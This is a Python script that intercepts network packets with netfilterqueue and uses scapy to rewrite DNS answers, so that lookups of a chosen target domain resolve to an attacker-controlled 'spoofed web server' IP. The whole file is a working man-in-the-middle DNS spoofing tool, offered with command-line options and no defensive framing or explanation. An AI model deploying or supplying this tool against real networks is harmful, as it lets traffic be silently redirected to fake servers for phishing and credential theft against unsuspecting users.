#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target_website", dest="target_web", help="Set the target web domain")
    parser.add_option("-g", "--mitm_ip", dest="mitm_ip", help="IP address of spoofed web server")
    (options, arguments) = parser.parse_args()
    if not options.target_web:
        parser.error("[-] Please specify a target web domain, use --help for more info.")
    elif not options.mitm_ip:
        parser.error("[-] Please specify a web server IP, use --help for more info.")
    return options


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.target_web in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.mitm_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

    packet.accept()


options = get_arguments()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
